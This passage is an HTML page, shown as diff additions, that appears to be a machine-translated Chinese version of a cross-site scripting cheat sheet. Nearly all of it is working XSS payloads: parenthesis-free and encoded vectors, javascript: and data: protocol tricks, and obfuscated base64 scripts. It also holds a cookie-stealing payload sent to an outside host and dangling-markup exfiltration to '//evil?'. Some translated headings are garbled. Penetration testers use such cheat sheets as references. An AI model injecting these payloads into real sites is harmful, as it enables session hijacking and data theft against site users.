+<h4 id="textarea-consuming-tag"><strong> textarea消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;textarea&gt;&lt;img title="&lt;/textarea&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/textarea&gt;</code></pre>
+<h4 id="noframes-consuming-tag"><strong>无帧消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;noframes&gt;&lt;img title="&lt;/noframes&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/noframes&gt;</code></pre>
+<h4 id="title-consuming-tag"><strong>标题消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;title&gt;&lt;img title="&lt;/title&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/title&gt;</code></pre>
+<h3 id="file-upload-attacks"><strong>文件上传攻击</strong></h3>
+<h4 id="add-blob-to-file-object"><strong>将Blob添加到文件对象</strong></h4>
+<pre class="language-javascript"><code>&lt;input type="file" id="fileInput" /&gt;&lt;script&gt;const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Demo!'], 'demo.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files&lt;/script&gt;</code></pre>
+<h3 id="restricted-characters"><strong>受限字符</strong></h3>
+<p>我们的跨站点脚本备忘单的这一部分讨论了受限字符。</p>
+<h4 id="no-parentheses-using-exception-handling"><strong>无括号使用异常处理</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-exception-handling-no-semicolons"><strong>没有使用异常处理的括号，没有分号</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-exception-handling-no-semicolons-using-expressions"><strong>没有使用异常处理的括号，没有使用表达式的分号</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;throw onerror=alert,1&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-exception-handling-and-eval"><strong>无括号使用异常处理和评估</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;throw onerror=eval,'=alert\x281\x29'&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-exception-handling-and-eval-on-firefox"><strong>在Firefox上使用异常处理和评估时没有括号</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-es6-hasinstance-and-instanceof-with-eval"><strong>使用ES6的括号没有Instance和instanceof与eval </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-es6-hasinstance-and-instanceof-with-eval-without"><strong>没有括号使用ES6 hasInstance和instanceof with eval without。</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-location-redirect"><strong>没有使用位置重定向的括号</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;location='javascript:alert\x281\x29'&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-location-redirect-no-strings"><strong>没有使用位置重定向的括号没有字符串</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;location=name&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-template-strings"><strong>没有使用模板字符串的括号</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;alert`1`&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-using-template-strings-and-location-hash"><strong>没有使用模板字符串和位置散列的括号</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;new Function`X${document.location.hash.substr`1`}`&lt;/script&gt;</code></pre>
+<h4 id="no-parentheses-or-spaces-using-template-strings-and-location-hash"><strong>没有括号或空格，使用模板字符串和位置散列</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;Function`X${document.location.hash.substr`1`}```&lt;/script&gt;</code></pre>
+<h4 id="xss-cookie-exfiltration-without-parentheses-backticks-or-quotes"><strong>没有圆括号、反斜杠或引号的XSS cookie过滤</strong></h4>
+<pre class="language-javascript"><code>&lt;video&gt;&lt;source onerror=location=/\02.rs/+document.cookie&gt;</code></pre>
+<h4 id="xss-without-greater-than"><strong> XSS无大于</strong></h4>
+<pre class="language-javascript"><code>&lt;svg onload=alert(1)</code></pre>
+<h4 id="array-based-destructuring-using-onerror"><strong>使用onerror进行基于数组的析构</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;throw[onerror]=[alert],1&lt;/script&gt;</code></pre>
+<h4 id="destructuring-using-onerror"><strong>使用一个错误进行析构</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;var{a:onerror}={a:alert};throw 1&lt;/script&gt;</code></pre>
+<h4 id="destructuring-using-default-values-and-onerror"><strong>使用默认值和onerror进行析构</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;var{haha:onerror=alert}=0;throw 1&lt;/script&gt;</code></pre>
+<h4 id="vector-using-window-name"><strong>使用window.name的矢量</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;window.name='javascript:alert(1)';&lt;/script&gt;&lt;svg onload=location=name&gt;</code></pre>
+<h3 id="frameworks"><strong>框架</strong></h3>
+<h4 id="bootstrap-onanimationstart-event">Bootstrap onanimationstart事件</h4>
+<pre class="language-javascript"><code>&lt;xss class=progress-bar-animated onanimationstart=alert(1)&gt;</code></pre>
+<h4 id="bootstrap-ontransitionend-event"><strong>引导传输结束事件</strong></h4>
+<pre class="language-javascript"><code>&lt;xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)&gt;&lt;xss class=carousel-inner&gt;&lt;xss class="carousel-item active"&gt;&lt;/xss&gt;&lt;xss class=carousel-item&gt;&lt;/xss&gt;&lt;/xss&gt;&lt;/xss&gt;</code></pre>
+<h3 id="protocols"><strong>协议</strong></h3>
+<p>在OWASP XSS备忘单的这一部分，我们将介绍各种XSS协议。</p>
+<h4 id="iframe-src-attribute-javascript-protocol"><strong> Iframe src属性JavaScript协议</strong></h4>
+<pre class="language-javascript"><code>&lt;iframe src="javascript:alert(1)"&gt;</code></pre>
+<h4 id="object-data-attribute-with-javascript-protocol"><strong>使用JavaScript协议的对象数据属性</strong></h4>
+<pre class="language-javascript"><code>&lt;object data="javascript:alert(1)"&gt;</code></pre>
+<h4 id="embed-src-attribute-with-javascript-protocol"><strong>用JavaScript协议嵌入src属性</strong></h4>
+<pre class="language-javascript"><code>&lt;embed src="javascript:alert(1)"&gt;</code></pre>
+<h4 id="a-standard-javascript-protocol">标准的JavaScript协议</h4>
+<pre class="language-javascript"><code>&lt;a href="javascript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="the-protocol-is-not-case-sensitive"><strong>协议不区分大小写</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="JaVaScript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="characters-x01-x20-are-allowed-before-the-protocol"><strong>协议前允许有字符\ x01-\ x20</strong></h4>
+<pre class="language-javascript"><code>&lt;a href=" javascript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="characters-x09-x0a-x0d-are-allowed-inside-the-protocol"><strong>协议中允许使用字符\x09、\x0a、\ x0d</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="javas cript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="characters-x09-x0a-x0d-are-allowed-after-protocol-name-before-the-colon"><strong>冒号前的协议名称后允许有字符\x09、\x0a、\ x0d</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="javascript :alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="xlink-namespace-inside-svg-with-javascript-protocol"><strong>使用JavaScript协议的SVG中的Xlink名称空间</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;a xlink:href="javascript:alert(1)"&gt;&lt;text x="20" y="20"&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre>
+<h4 id="svg-animate-tag-using-values"><strong> SVG使用值制作标签动画</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;animate xlink:href=#xss attributeName=href values=javascript:alert(1) /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre>
+<h4 id="svg-animate-tag-using-to"><strong> SVG动画标签使用到</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre>
+<h4 id="svg-set-tag">t0±SVG设置tago±t1±1</h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre>
+<h4 id="data-protocol-inside-script-src"><strong>脚本src内的数据协议</strong></h4>
+<pre class="language-javascript"><code>&lt;script src="data:text/javascript,alert(1)"&gt;&lt;/script&gt;</code></pre>
+<h4 id="svg-script-href-attribute-without-closing-script-tag"><strong>没有结束脚本标签的SVG脚本href属性</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;script href="data:text/javascript,alert(1)" /&gt;</code></pre>
+<h4 id="svg-use-element-chrome-firefox"><strong> SVG使用元素Chrome/Firefox </strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.anonymous.org/2000/svg' xmlns:xlink='http://www.anonymous.org/1999/xlink' width='100' height='100'&gt;&lt;a xlink:href='javascript:alert(1)'&gt;&lt;rect x='0' y='0' width='100' height='100' /&gt;&lt;/a&gt;&lt;/svg&gt;#x"&gt;&lt;/use&gt;&lt;/svg&gt;</code></pre>
+<h4 id="import-statement-with-data-url"><strong>导入数据URL为</strong>的语句</h4>
+<pre class="language-javascript"><code>&lt;script&gt;import('data:text/javascript,alert(1)')&lt;/script&gt;</code></pre>
+<h4 id="base-tag-with-javascript-protocol-rewriting-relative-urls"><strong>使用JavaScript协议重写相对URL的基本标签</strong></h4>
+<pre class="language-javascript"><code>&lt;base href="javascript:/a/-alert(1)///////"&gt;&lt;a href=../lol/page.html&gt;test&lt;/a&gt;</code></pre>
+<h4 id="mathml-makes-any-tag-clickable">MathML使得任何标签都可以点击</h4>
+<pre class="language-javascript"><code>&lt;math&gt;&lt;x href="javascript:alert(1)"&gt;blah</code></pre>
+<h4 id="button-and-formaction"><strong>按钮和动作</strong></h4>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;XSS</code></pre>
+<h4 id="input-and-formaction"><strong>输入和形成动作</strong></h4>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;input type=submit formaction=javascript:alert(1) value=XSS&gt;</code></pre>
+<h4 id="form-and-action"><strong>形式和动作</strong></h4>
+<pre class="language-javascript"><code>&lt;form action=javascript:alert(1)&gt;&lt;input type=submit value=XSS&gt;</code></pre>
+<h4 id="animate-tag-with-keytimes-and-multiple-values"><strong>用关键时间和多值制作标签动画</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&amp;semi;javascript:alert(1)&amp;semi;0" /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre>
+<h4 id="javascript-protocol-with-new-line"><strong>带新行的JavaScript协议</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="javascript://%0aalert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="data-url-with-use-element-and-base64-encoded"><strong>使用元素和base64编码的数据URL</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /&gt;&lt;/svg&gt;</code></pre>
+<h4 id="data-url-with-use-element"><strong>带有使用元素的数据URL</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;use href="data:image/svg+xml,&amp;lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&amp;gt;&amp;lt;image href='1' onerror='alert(1)' /&amp;gt;&amp;lt;/svg&amp;gt;#x" /&gt;</code></pre>
+<h4 id="animate-tag-with-auto-executing-use-element"><strong>使用自动执行元素制作标签动画</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&amp;lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&amp;gt;&amp;lt;image href='1' onerror='alert(1)' /&amp;gt;&amp;lt;/svg&amp;gt;#x" /&gt;&lt;use id=x /&gt;</code></pre>
+<h3 id="other-useful-attributes"><strong>其他有用的属性</strong></h3>
+<h4 id="using-srcdoc-attribute"><strong>使用srcdoc属性</strong></h4>
+<pre class="language-javascript"><code>&lt;iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"&gt;&lt;/iframe&gt;</code></pre>
+<h4 id="using-srcdoc-with-entities"><strong>对实体使用srcdoc</strong></h4>
+<pre class="language-javascript"><code>&lt;iframe srcdoc="&amp;lt;img src=1 onerror=alert(1)&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
+<h4 id="click-a-submit-element-from-anywhere-on-the-page-even-outside-the-form"><strong>在页面的任何地方点击提交元素，甚至在表单之外</strong></h4>
+<pre class="language-javascript"><code>&lt;form action="javascript:alert(1)"&gt;&lt;input type=submit id=x&gt;&lt;/form&gt;&lt;label for=x&gt;XSS&lt;/label&gt;</code></pre>
+<h4 id="hidden-inputs-access-key-attributes-can-enable-xss-on-normally-unexploitable-elements"><strong>隐藏输入:访问键属性可以在通常不可利用的元素上启用XSS</strong></h4>
+<pre class="language-javascript"><code>&lt;input type="hidden" accesskey="X" onclick="alert(1)"&gt; (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)</code></pre>
+<h4 id="link-elements-access-key-attributes-can-enable-xss-on-normally-unexploitable-elements"><strong>链接元素:访问键属性可以在通常不可利用的元素上启用XSS</strong></h4>
+<pre class="language-javascript"><code>&lt;link rel="canonical" accesskey="X" onclick="alert(1)" /&gt; (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)</code></pre>
+<h4 id="download-attribute-can-save-a-copy-of-the-current-webpage"><strong>下载属性可以保存当前网页的副本</strong></h4>
+<pre class="language-javascript"><code>&lt;a href=# download="filename.html"&gt;Test&lt;/a&gt;</code></pre>
+<h4 id="disable-referrer-using-referrerpolicy"><strong>使用推荐策略</strong>禁用推荐</h4>
+<pre class="language-javascript"><code>&lt;img referrerpolicy="no-referrer" src="//portswigger-labs.net"&gt;</code></pre>
+<h4 id="set-window-name-via-parameter-on-the-window-open-function"><strong>通过window.open函数的参数设置window.name】</strong></h4>
+<pre class="language-javascript"><code>&lt;a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&amp;x=%27;eval(name)//','alert(1)')"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="set-window-name-via-name-attribute-in-a-iframe-tag"><strong>通过&lt; iframe &gt;标签</strong>中的name属性设置window.name</h4>
+<pre class="language-javascript"><code>&lt;iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&amp;x=%27;eval(name)//"&gt;&lt;/iframe&gt;</code></pre>
+<h4 id="set-window-name-via-target-attribute-in-a-base-tag"><strong>通过&lt;基&gt;标签</strong>中的目标属性设置window.name</h4>
+<pre class="language-javascript"><code>&lt;base target="alert(1)"&gt;&lt;a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&amp;x=%27;eval(name)//"&gt;XSS via target in base tag&lt;/a&gt;</code></pre>
+<h4 id="set-window-name-via-target-attribute-in-a-a-tag"><strong>通过&lt;标签</strong>中的目标属性设置window.name</h4>
+<pre class="language-javascript"><code>&lt;a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&amp;x=%27;eval(name)//"&gt;XSS via target in a tag&lt;/a&gt;</code></pre>
+<h4 id="set-window-name-via-usemap-attribute-in-a-img-tag"><strong>通过&lt; img &gt;标签</strong>中的usemap属性设置window.name</h4>
+<pre class="language-javascript"><code>&lt;img src="validimage.png" width="10" height="10" usemap="#xss"&gt;&lt;map name="xss"&gt;&lt;area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_st%C0%BCscript&gt;alert(1)&lt;/script&gt; %E0%80%BCscript&gt;alert(1)&lt;/script&gt; %F0%80%80%BCscript&gt;alert(1)&lt;/script&gt; %F8%80%80%80%BCscript&gt;alert(1)&lt;/script&gt; %FC%80%80%80%80%BCscript&gt;alert(1)&lt;/script&gt;ring_single&amp;x=%27;eval(name)//"&gt;&lt;/map&gt;</code></pre>
+<h4 id="set-window-name-via-target-attribute-in-a-form-tag"><strong>通过&lt;表单&gt;标签</strong>中的目标属性设置window.name</h4>
+<pre class="language-javascript"><code>&lt;form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"&gt;&lt;input type=hidden name=x value="';eval(name)//"&gt;&lt;input type=hidden name=context value=js_string_single&gt;&lt;input type="submit" value="XSS via target in a form"&gt;&lt;/form&gt;</code></pre>
+<h4 id="set-window-name-via-formtarget-attribute-in-a-input-tag-type-submit"><strong>通过formtarget属性在&lt;中设置window.name输入&gt;标签类型提交</strong></h4>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;input type=hidden name=x value="';eval(name)//"&gt;&lt;input type=hidden name=context value=js_string_single&gt;&lt;input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"&gt;&lt;/form&gt;</code></pre>
+<h4 id="set-window-name-via-formtarget-attribute-in-a-input-tag-type-image"><strong>通过&lt;输入&gt;标签类型图片</strong>中的formtarget属性设置window.name</h4>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;input type=hidden name=x value="';eval(name)//"&gt;&lt;input type=hidden name=context value=js_string_single&gt;&lt;input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"&gt;&lt;/form&gt;</code></pre>
+
+<p>现在，让我们继续探索用于XSS的各种特殊标签。</p>
+<h4 id="redirect-to-a-different-domain"><strong>重定向到不同的域</strong></h4>
+<pre class="language-javascript"><code>&lt;meta http-equiv="refresh" content="0; url=//portswigger-labs.net"&gt;</code></pre>
+
+<pre class="language-javascript"><code>&lt;meta charset="UTF-7" /&gt; +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>
+
+<pre class="language-javascript"><code>&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /&gt; +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>
+<h4 id="utf-7-bom-characters-has-to-be-at-the-start-of-the-document-1"><strong> UTF-7 BOM字符(必须在文档的开头)1 </strong></h4>
+<pre class="language-javascript"><code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>
+<h4 id="utf-7-bom-characters-has-to-be-at-the-start-of-the-document-2"><strong> UTF-7 BOM字符(必须在文档的开头)2 </strong></h4>
+<pre class="language-javascript"><code>+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>
+<h4 id="utf-7-bom-characters-has-to-be-at-the-start-of-the-document-3"><strong> UTF-7 BOM字符(必须在文档的开头)3 </strong></h4>
+<pre class="language-javascript"><code>+/v+ +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>
+<h4 id="utf-7-bom-characters-has-to-be-at-the-start-of-the-document-4"><strong> UTF-7 BOM字符(必须在文档的开头)4 </strong></h4>
+<pre class="language-javascript"><code>+/v/ +ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>
+<h4 id="upgrade-insecure-requests"><strong>升级不安全请求</strong></h4>
+<pre class="language-javascript"><code>&lt;meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"&gt;</code></pre>
+<h4 id="disable-javascript-via-iframe-sandbox"><strong>通过iframe沙箱禁用JavaScript】</strong></h4>
+<pre class="language-javascript"><code>&lt;iframe sandbox src="//portswigger-labs.net"&gt;&lt;/iframe&gt;</code></pre>
+<h4 id="disable-referer"><strong>禁用推荐人</strong></h4>
+<pre class="language-javascript"><code>&lt;meta name="referrer" content="no-referrer"&gt;</code></pre>
+<h3 id="encoding"><strong>编码</strong></h3>
+<h4 id="overlong-utf-8"><strong>超长UTF-8 </strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;\u0061lert(1)&lt;/script&gt;</code></pre>
+<p><strong> Unicode转义ES6样式</strong></p>
+<pre class="language-javascript"><code>&lt;script&gt;\u{61}lert(1)&lt;/script&gt;</code></pre>
+<p><strong> Unicode转义ES6样式零填充</strong></p>
+<pre class="language-javascript"><code>&lt;script&gt;\u{0000000061}lert(1)&lt;/script&gt;</code></pre>
+<p><strong>十六进制编码JavaScript转义</strong></p>
+<pre class="language-javascript"><code>&lt;script&gt;eval('\x61lert(1)')&lt;/script&gt;</code></pre>
+<h4 id="octal-encoding"><strong>八进制编码</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;eval('\141lert(1)')&lt;/script&gt; &lt;script&gt;eval('alert(\061)')&lt;/script&gt; &lt;script&gt;eval('alert(\61)')&lt;/script&gt;</code></pre>
+<h4 id="decimal-encoding-with-optional-semicolon"><strong>带可选分号的十进制编码</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="&amp;#106;avascript:alert(1)"&gt;XSS&lt;/a&gt;&lt;a href="&amp;#106avascript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="svg-script-with-html-encoding"><strong>带HTML编码的SVG脚本</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt; &lt;svg&gt;&lt;script&gt;&amp;#x61;lert(1)&lt;/script&gt;&lt;/svg&gt; &lt;svg&gt;&lt;script&gt;alert&amp;NewLine;(1)&lt;/script&gt;&lt;/svg&gt; &lt;svg&gt;&lt;script&gt;x="&amp;quot;,alert(1)//";&lt;/script&gt;&lt;/svg&gt;</code></pre>
+<h4 id="decimal-encoding-with-padded-zeros"><strong>带填充零的十进制编码</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="&amp;#0000106avascript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="hex-encoding-entities"><strong>十六进制编码实体</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="&amp;#x6a;avascript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="hex-encoding-without-semicolon-provided-next-character-is-not-a-f0-9"><strong>不带分号的十六进制编码提供的下一个字符不是a-f0-9 </strong></h4>
+<pre class="language-javascript"><code>&lt;a href="j&amp;#x61vascript:alert(1)"&gt;XSS&lt;/a&gt; &lt;a href="&amp;#x6a avascript:alert(1)"&gt;XSS&lt;/a&gt; &lt;a href="&amp;#x6a avascript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="hex-encoding-with-padded-zeros"><strong>带填充零的十六进制编码</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="&amp;#x0000006a;avascript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="hex-encoding-is-not-case-sensitive"><strong>十六进制编码不区分大小写</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="&amp;#X6A;avascript:alert(1)"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="html-entities"><strong> HTML实体</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="javascript&amp;colon;alert(1)"&gt;XSS&lt;/a&gt; &lt;a href="java&amp;Tab;script:alert(1)"&gt;XSS&lt;/a&gt; &lt;a href="java&amp;NewLine;script:alert(1)"&gt;XSS&lt;/a&gt; &lt;a href="javascript&amp;colon;alert&amp;lpar;1&amp;rpar;"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="url-encoding"><strong>网址编码</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="javascript:x='%27-alert(1)-%27';"&gt;XSS&lt;/a&gt;</code></pre>
+<h4 id="html-entities-and-url-encoding"><strong> HTML实体和URL编码</strong></h4>
+<pre class="language-javascript"><code>&lt;a href="javascript:x='&amp;percnt;27-alert(1)-%27';"&gt;XSS&lt;/a&gt;</code></pre>
+<h3 id="obfuscation"><strong>混淆</strong></h3>
+<h4 id="data-protocol-inside-script-src-with-base64"><strong>base64脚本src内的数据协议</strong></h4>
+<pre class="language-javascript"><code>&lt;script src=data:text/javascript;base64,YWxlcnQoMSk=&gt;&lt;/script&gt;</code></pre>
+<h4 id="data-protocol-inside-script-src-with-base64-and-html-entities"><strong>带有base64和HTML实体的脚本src内的数据协议</strong></h4>
+<pre class="language-javascript"><code>&lt;script src=data:text/javascript;base64,&amp;#x59;&amp;#x57;&amp;#x78;&amp;#x6c;&amp;#x63;&amp;#x6e;&amp;#x51;&amp;#x6f;&amp;#x4d;&amp;#x53;&amp;#x6b;&amp;#x3d;&gt;&lt;/script&gt;</code></pre>
+<h4 id="data-protocol-inside-script-src-with-base64-and-url-encoding"><strong>带base64和URL编码的脚本src内的数据协议</strong></h4>
+<pre class="language-javascript"><code>&lt;script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d&gt;&lt;/script&gt;</code></pre>
+<h4 id="iframe-srcdoc-html-encoded"><strong> Iframe srcdoc HTML编码</strong></h4>
+<pre class="language-javascript"><code>&lt;iframe srcdoc=&amp;lt;script&amp;gt;alert&amp;lpar;1&amp;rpar;&amp;lt;&amp;sol;script&amp;gt;&gt;&lt;/iframe&gt;</code></pre>
+<h4 id="iframe-javascript-url-with-html-and-url-encoding"><strong>带有HTML和URL编码的Iframe JavaScript URL</strong></h4>
+<pre class="language-javascript"><code>&lt;iframe src="javascript:'&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;'"&gt;&lt;/iframe&gt;</code></pre>
+<h4 id="svg-script-with-unicode-escapes-and-html-encoding"><strong>带unicode转义和HTML编码的SVG脚本</strong></h4>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;script&gt;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x31;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x63;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x32;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x34;(1)&lt;/script&gt;&lt;/svg&gt;</code></pre>
+<h4 id="img-tag-with-base64-encoding"><strong>采用base64编码的Img标签</strong></h4>
+<pre class="language-javascript"><code>&lt;img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`&gt;</code></pre>
+<p><strong>背景属性</strong></p>
+<pre class="language-javascript"><code>&lt;body background="//evil? &lt;table background="//evil? &lt;table&gt;&lt;thead background="//evil? &lt;table&gt;&lt;tbody background="//evil? &lt;table&gt;&lt;tfoot background="//evil? &lt;table&gt;&lt;td background="//evil? &lt;table&gt;&lt;th background="//evil?</code></pre>
+<h3 id="scriptless-attacks"><strong>无脚本攻击</strong></h3>
+<h4 id="link-href-stylesheet"><strong>链接href样式表</strong></h4>
+<pre class="language-javascript"><code>&lt;link rel=stylesheet href="//evil?</code></pre>
+<h4 id="link-href-icon"><strong>链接href图标</strong></h4>
+<pre class="language-javascript"><code>&lt;link rel=icon href="//evil?</code></pre>
+
+<pre class="language-javascript"><code>&lt;meta http-equiv="refresh" content="0; http://evil?</code></pre>
+<h4 id="img-to-pass-markup-through-src-attribute"><strong> Img通过src属性传递标记</strong></h4>
+<pre class="language-javascript"><code>&lt;img src="//evil? &lt;image src="//evil?</code></pre>
+<h4 id="video-using-track-element"><strong>使用轨道元素的视频</strong></h4>
+<pre class="language-javascript"><code>&lt;video&gt;&lt;track default src="//evil?</code></pre>
+<h4 id="video-using-source-element-and-src-attribute"><strong>使用源元素和src属性的视频</strong></h4>
+<pre class="language-javascript"><code>&lt;video&gt;&lt;source src="//evil?</code></pre>
+<h4 id="audio-using-source-element-and-src-attribute"><strong>使用源元素和src属性的音频</strong></h4>
